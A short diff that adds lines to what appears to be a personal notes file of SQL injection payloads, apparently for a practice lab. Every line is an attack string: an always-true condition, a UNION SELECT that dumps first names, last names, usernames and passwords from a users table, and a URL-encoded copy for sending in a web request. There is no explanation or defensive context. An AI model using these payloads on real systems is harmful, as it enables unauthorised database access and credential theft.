@@ -1,2 +1,13 @@
 %' or 1='1
 ' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+$username = 1' or '1' = '1
+
+' and 1=0 union select null, concat
+(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+
+%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a
+%2Clast_name%2C0x0a%2Cuser%2Cpassword%29+from+users+%23
+
+
+
